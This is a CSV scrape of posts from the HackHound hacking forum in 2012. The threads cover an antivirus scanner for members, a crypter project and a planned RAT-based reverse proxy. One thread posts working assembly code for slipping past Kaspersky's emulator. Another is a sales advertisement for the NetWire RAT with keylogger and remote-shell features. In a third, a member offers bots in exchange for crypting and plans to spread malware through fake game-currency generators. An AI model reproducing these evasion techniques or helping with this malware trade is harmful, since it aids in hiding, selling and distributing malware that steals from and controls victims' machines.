subforum,threadTitle,authorName,postdatetime,flatcontent,userTitle
HackHound Scanner - Team Projects - HackHound,hackhound-scanner,Ravage,11/24/2012 0:00,HackHound Scanner is now ready. You can find it using the main navigation menu or here http://scanner.hackhound.org The scanner uses scan4you API and is totally free of charge for selected/voted/accepted members. You can request access and read rules about it on Requests section of the forum. Thanks to everybody that worked on this. Sorry for taking so long but unfortunately our free time isn't the greatest at the moment. Accepted members will get a PM from us with login details throughout the day today or tomorrow tops. Feel free to report any problems or suggestions.,Expert
HackHound Scanner - Team Projects - HackHound,hackhound-scanner,turbo420,11/24/2012 0:00,awesome thanks admins,AdvancedMember
HackHound Scanner - Team Projects - HackHound,hackhound-scanner,turbo420,11/24/2012 0:00,one thing i would like to know is how many members can we vote in to use the scanner is there a limit ?,AdvancedMember
HackHound Scanner - Team Projects - HackHound,hackhound-scanner,Ravage,11/24/2012 0:00,Members that want access should request it and get voted by other members on a poll. You can vote once on any poll (each member request topic).,Expert
HackHound Scanner - Team Projects - HackHound,hackhound-scanner,turbo420,11/24/2012 0:00,nevermind not what i asked,AdvancedMember
HackHound Scanner - Team Projects - HackHound,hackhound-scanner,Ravage,11/24/2012 0:00,What did you ask then?,Expert
HackHound Scanner - Team Projects - HackHound,hackhound-scanner,turbo420,11/24/2012 0:00,how many members can we vote in? like 200 0r 25 members is there a limit on scanner like the load on the scanner? you get me?,AdvancedMember
HackHound Scanner - Team Projects - HackHound,hackhound-scanner,Ravage,11/24/2012 0:00,"I guess we'll have to decide that as we go. Not really concerned about HackHound's server load but about scan4you capacity to scan a load full of file coming from our scanner, so we will analyze this in the future.",Expert
HackHound Scanner - Team Projects - HackHound,hackhound-scanner,turbo420,11/24/2012 0:00,just asking. and how long will members have to use the scanner too like days or weeks? things to think about i guess thanks Ravage i will give it try in abit,AdvancedMember
HackHound Scanner - Team Projects - HackHound,hackhound-scanner,Dante,11/24/2012 0:00,Looks awesome Ravage. Not that I am into scanning files everyday but it's a nice add-on for HH indeed.,IntermediateMember
HackHound Scanner - Team Projects - HackHound,hackhound-scanner,exensoft,11/25/2012 0:00,Thank you very much for your hard work! It looks perfect. And I totally agree with Dante. It's a really nice feature for HH.,Member
Member # 1000 - Challenges - HackHound,member-1000,Guest_TeknoZed_*,11/25/2012 0:00,no bot here message sent admin,NULL
HackHound Scanner - Team Projects - HackHound,hackhound-scanner,Anli,11/26/2012 0:00,Thats really good project but can u tell me how i can get membership there?,Member
HackHound Scanner - Team Projects - HackHound,hackhound-scanner,turbo420,11/26/2012 0:00,lol Anli you got your membership there you signin now you need to post and be apart hackhound and you can use the scanner for free like me thats all you need to do tip from turbo420,AdvancedMember
HackHound Scanner - Team Projects - HackHound,hackhound-scanner,khanisgr8,11/27/2012 0:00,Nice,Member
HackHound Scanner - Team Projects - HackHound,hackhound-scanner,Guest_CodeXero_*,11/27/2012 0:00,thanks admin!,NULL
DaRel - Reverse Proxy Data Relay  [stage1] - Team Projects - HackHound,darel-reverse-proxy-data-relay-stage1,Dante,11/28/2012 0:00,I've decided to annouce that I will be developping a basic Reverve Proxy for HackHound this next few weeks. It will have to be based on some lightweight rat to inject and connect back to client to relay de data through open socks on remote machine. I think it will be developped in Delphi. Not sure yet what compiler will be used but I will keep everybody updated. Plan also to have a stable release done on time for HackHound Fever Event.,IntermediateMember
DaRel - Reverse Proxy Data Relay  [stage1] - Team Projects - HackHound,darel-reverse-proxy-data-relay-stage1,Anli,11/28/2012 0:00,"I've decided to annouce that I will be developping a basic Reverve Proxy for HackHound this next few weeks. It will have to be based on some lightweight rat to inject and connect back to client to relay de data through open socks on remote machine. I think it will be developped in Delphi. Not sure yet what compiler will be used but I will keep everybody updated. Plan also to have a stable release done on time for HackHound Fever Event. Nice plan dante, if you need any help, you can write me any time, i will be glad if i help u.",Member
DaRel - Reverse Proxy Data Relay  [stage1] - Team Projects - HackHound,darel-reverse-proxy-data-relay-stage1,AKL3GEND,11/28/2012 0:00,if you need a beta tester i can help you out with it. on testing the compiled.,IntermediateMember
HackHound Scanner - Team Projects - HackHound,hackhound-scanner,dindoungagos,11/28/2012 0:00,"Wouaaou, very fast this Hackhound scanner, it's impressive. Thank you again for this share Good work Ravage",Member
Member # 1000 - Challenges - HackHound,member-1000,Ravage,11/29/2012 0:00,TeknoZed chose to get a regular web hosting solution instead for the same period of time. This topic is now locked. TeknoZed feel free to contact me if you need anything regarding your account.,Expert
Anti kaspersky emulator collection - Resources - HackHound,anti-kaspersky-emulator-collection,cob_258,12/8/2012 0:00,"Salam, and sorry for my bad english This is a collection of anti kaspersky emualtor bugs, most of them are fixed on 2013 version Depending on how you implement these codes, your program may be MORE detectable because of used API (you know how to hide APIs) the 3 first sploits found by COB, the 4th is based on grzonu api replace (SuspendThread with ResumeThread) codes by COB 1 - VirtualAlloc sploit (fixed on 2013 version) if emualted, ECX register keep the same value after VirtualAlloc, in normal execution it changes * note : works also against bitdefender, not tested with last one Code : xor ecx,ecx invoke VirtualAlloc,0,1000,MEM_COMMIT,40h .if !ecx; is emulated? invoke ExitProcess,0 ; exit .endif ; /smile.png' class='bbc_emoticon' alt=':)' / or xor ecx,ecx invoke VirtualAlloc,0,5000,MEM_COMMIT,40h xor edx,edx div cx ; div by 0 2 - GetSystemTime sploit (fixed on 2013 version) Tested on XP and 7, after calling GetSystemTime ecx has the value of the milliseconds, it's not the case if emulated Code : invoke GetSystemTime,addr time .if cx!=time.wMilliseconds invoke ExitProcess,00 .endif 3 - zFlag after exception (fixed on 2013 version) Code : push seh ; Creating our SEH assume FS : nothing push dword ptr FS:[0] mov dword ptr FS:[0], esp int 3 ; exception ret ; if exception weren't handled return (may be debugging) seh: je @f ; check the z flag invoke ExitProcess,0 ; if z!=1, emulator detected @@: 4 - Api replace (still working) Idea based on grzonu API replace sploit (SuspendThread with ResumeThread), in this code I replace the ZwTerminateProcess code with ""leave;leave;ret"" * Notes : The ExitProcess api doesn't save ESI,EDI and EBX values so you have to do It Code : local olddata:DWORD local oldprotect:DWORD local TerminateProc:DWORD pushad ; save REGs mov ebx,ZwTerminateProcess ; ptr to ""jmp dword ptr[ntdll.ZwTerminateProcess]"" inc ebx inc ebx mov ebx,[ebx] ; ebx = address of ZwTerminateProcess invoke VirtualProtect,ebx,4,PAGE_EXECUTE_READWRITE,addr oldprotect mov eax,0c3c9c9h xchg eax,dword ptr[ebx]; replace ZwTerminateProcess code by ""leave; leave; ret"" mov olddata,eax mov TerminateProc,ebx invoke ExitProcess,00 ; under emulator, this code exits and nothing detected mov ebx,TerminateProc mov eax,olddata mov dword ptr[ebx],eax ; ZwTerminateProcess code popad ; restore REGs",Member
Anti kaspersky emulator collection - Resources - HackHound,anti-kaspersky-emulator-collection,x58,12/8/2012 0:00,Really good thread. Thanks for posting this useful information Cob.,Advanced
Anti kaspersky emulator collection - Resources - HackHound,anti-kaspersky-emulator-collection,cob_258,12/8/2012 0:00,You're welcome,Member
Anti kaspersky emulator collection - Resources - HackHound,anti-kaspersky-emulator-collection,Game Over,12/9/2012 0:00,WoOoW i Hope It Work Thenx,Newbie
DaRel - Reverse Proxy Data Relay  [stage1] - Team Projects - HackHound,darel-reverse-proxy-data-relay-stage1,Underline,12/9/2012 0:00,we are hopeful for this release. good luck mate,Member
Delphi 7 Personal Edition - Development Software - HackHound,delphi-7-personal-edition,goldenedge,12/10/2012 0:00,in delphi are we talking about metus delphi because i believe i need a new one,Member
Bots for Crypt - Trades & Freebies - HackHound,bots-for-crypt,goldenedge,12/10/2012 0:00,"tell me if i can or cant do this but im looking for somebody to crypt my server (.exe less than 200kb) in exchange for a clean bot At the moment i dont have any bots so for the first trade i ask you for your trust Name your requested amount of bots and ill be sure to give them to you in under a week I have people to spread for me on xbox, ps3 and wii they will be playing the most popular games released in the past 3 months and messaging everybody possible with things like microsoft point generator, wii points and things like that. I myself will be spreading on the computer threw torrents and on xbox playing black ops 2 Please let me know and we can work out a deal",Member
Delphi 7 Personal Edition - Development Software - HackHound,delphi-7-personal-edition,Underline,12/11/2012 0:00,clean copy or not ??,Member
Delphi 7 Personal Edition - Development Software - HackHound,delphi-7-personal-edition,Underline,12/11/2012 0:00,download not available,Member
NetWire Remote Control - Verified Sellers - HackHound,netwire-remote-control,dugidox,12/11/2012 0:00,"Multi Platform Support Workstation Info Workstation is compiled in Delphi 7, with clean and simple user friendly GUI (Windows only) (Client does not run under Virtual Environment) Host Info Compiled in C as a Native application, without requiring any Framework (such as .NET), Virtual Machine (such as Java Virtual Machine) or any Extra Dynamic Link Libraries (Windows, Linux, Solaris, Mac OS X) Doesn't require admin/root rights at remote machine Light weight size, average for all platforms ~60kB Using minimal resources at remote machine Output is detected by most AntiVirus, where you need additional tool for undetection Features Advanced File Manager Password Recovery Remote Shell Reverse Proxy (Hybrid socks4/5 server) Proxifier Screen Capture Keylogger HTTP Downloader Bandwidth Limiter Price 6 months License with support and updates $40 1 year License with support and updates $80 2 years License with support and updates $140 Payment Options Liberty Reserve Bitcoins You can PM me or BUY HERE automatically Here is test version if anyone wanna try Netwire Test Edited by Ravage, 15 May 2013 - 11:32 PM.",Banned
NetWire Remote Control - Verified Sellers - HackHound,netwire-remote-control,Dante,12/11/2012 0:00,Good luck with sales dugidox. Seems like a cool application to me.,IntermediateMember
Hackhound Crypter 2012 - Team Projects - HackHound,hackhound-crypter-2012,zad,12/11/2012 0:00,check plz,Member
Hackhound Crypter 2012 - Team Projects - HackHound,hackhound-crypter-2012,turbo420,12/11/2012 0:00,i checked it out zad its clean he does not going backdoor stuff and put in hackhound Fever lol that would nuts,AdvancedMember
Hackhound Crypter 2012 - Team Projects - HackHound,hackhound-crypter-2012,turbo420,12/11/2012 0:00,tested it on vista 64bit all works great no errors at all 3x1337 good work,AdvancedMember
Hackhound Crypter 2012 - Team Projects - HackHound,hackhound-crypter-2012,Anli,12/11/2012 0:00,"good job buddy, which language did u used delphi ?",Member
Hackhound Crypter 2012 - Team Projects - HackHound,hackhound-crypter-2012,Dante,12/11/2012 0:00,Turbo you sound like you were expecting a lot of bugs. LoL,IntermediateMember
Hackhound Crypter 2012 - Team Projects - HackHound,hackhound-crypter-2012,Anli,12/11/2012 0:00,written in shitty vb6 what else huh come on dude are u serious ? O.o,Member
Hackhound Crypter 2012 - Team Projects - HackHound,hackhound-crypter-2012,HttP-NuKe,12/11/2012 0:00,"very nice work ummm, does it support .net executables?",AdvancedMember
Hackhound Crypter 2012 - Team Projects - HackHound,hackhound-crypter-2012,L30,12/11/2012 0:00,Thank you bro for this crypter! Nice work! Regards!,Member
Hackhound Crypter 2012 - Team Projects - HackHound,hackhound-crypter-2012,Zirach,12/11/2012 0:00,Thanks bro!,Newbie
Hackhound Crypter 2012 - Team Projects - HackHound,hackhound-crypter-2012,Underline,12/12/2012 0:00,Will check it soon. Seems gr8... Why not you make it open source lol,Member
Anti kaspersky emulator collection - Resources - HackHound,anti-kaspersky-emulator-collection,cob_258,12/12/2012 0:00,"bugfix the last code local olddata:DWORD local oldprotect:DWORD local TerminateProc:DWORD pushad ; save REGs mov ebx,ZwTerminateProcess ; ptr to ""jmp dword ptr[ntdll.ZwTerminateProcess]"" inc ebx inc ebx mov ebx,[ebx] ; I forgot this line mov ebx,[ebx] ; ebx = address of ZwTerminateProcess invoke VirtualProtect,ebx,4,PAGE_EXECUTE_READWRITE,addr oldprotect mov eax,0c3c9c9h xchg eax,dword ptr[ebx]; replace ZwTerminateProcess code by ""leave; leave; ret"" mov olddata,eax mov TerminateProc,ebx invoke ExitProcess,00 ; under emulator, this code exits and nothing detected mov ebx,TerminateProc mov eax,olddata mov dword ptr[ebx],eax ; ZwTerminateProcess code popad ; restore REGs Ret the use following code only if you compile with MASM32 ... mov ebx,ZwTerminateProcess inc ebx inc ebx mov ebx,[ebx] mov ebx,[ebx] ... if you use GetProcAddress to solve ZwTerminateProcess or you compile with multimateAssembler (olly plugin), use this .Data szNtdll db ""ntdll.dll"",00 szZwTerminateProcess db ""ZwTerminateProcess "",00 .code ... invoke GetModuleHandle,addr szNtdll invoke GetProcAddress,eax, addr ZwTerminateProcess mov ebx,eax ...",Member
Hackhound Crypter 2012 - Team Projects - HackHound,hackhound-crypter-2012,JuMp3r,12/12/2012 0:00,nice work 3x1337,Member
Hackhound Crypter 2012 - Team Projects - HackHound,hackhound-crypter-2012,core33,12/12/2012 0:00,is it fwb++ ?,Newbie
Hackhound Crypter 2012 - Team Projects - HackHound,hackhound-crypter-2012,Pink,12/12/2012 0:00,"tested on W7 x64 work good. I think you should fix the injection that only can select one. If someone stupid select all, run 6 times. hahaah maybe implement mutex and melt file and explorer web defalulf inject. good job. sorry for my stupid english :S like Caveman. hahaha regards",IntermediateMember
Hackhound Crypter 2012 - Team Projects - HackHound,hackhound-crypter-2012,x58,12/12/2012 0:00,"Looks good 3x1337. Good job! I'll release some of my stuff too next week. Really busy now still didn't had any free time and mood for it... Study, internship, work, etc..",Advanced
NetWire Remote Control - Verified Sellers - HackHound,netwire-remote-control,dugidox,12/13/2012 0:00,Good luck with sales dugidox. Seems like a cool application to me. Here is test version if anyone wanna try Netwire Test,Banned
Delphi XE3 and C++Builder XE3 ISO (includes Update 1) - Development Software - HackHound,delphi-xe3-and-cbuilder-xe3-iso-includes-update-1,sergelen,12/14/2012 0:00,EDN Direct Download Delphi XE3 and C++Builder XE3 ISO (includes Update 1) http://altd.embarcad...e3_upd1_win.iso C++Builder XE3 Install from the Web (includes Update 1) http://altd.embarcad...pd1_win_esd.exe,Beginner
Delphi XE3 and C++Builder XE3 ISO (includes Update 1) - Development Software - HackHound,delphi-xe3-and-cbuilder-xe3-iso-includes-update-1,sergelen,12/14/2012 0:00,HTML5 Builder XE3 Update 1 http://altd.embarcad...er_upd1_win.zip,Beginner
BusinessSkinForm 10.10 - Extra - HackHound,businessskinform-1010,sWZ,12/15/2012 0:00,Skin component Attached Files bsf1010.rar 986.57KB 169 downloads,Beginner
DynamicSkinForm 12.8 - Extra - HackHound,dynamicskinform-128,sWZ,12/15/2012 0:00,delphi skin Attached Files dsf1280.rar 775.48KB 145 downloads,Beginner
AlphaControls v8.10 Stable released Full Source - Extra - HackHound,alphacontrols-v810-stable-released-full-source,sWZ,12/15/2012 0:00,AlphaControls v8.10 Stable released Full Source Attached Files AlphaControls v8.10 Stable released Full Source(1).rar 696.63KB 109 downloads,Beginner
DaRel - Reverse Proxy Data Relay  [stage1] - Team Projects - HackHound,darel-reverse-proxy-data-relay-stage1,Socal93,12/15/2012 0:00,Are you going to base it on for windows or Linux systems or mutiple platforms ?,IntermediateMember
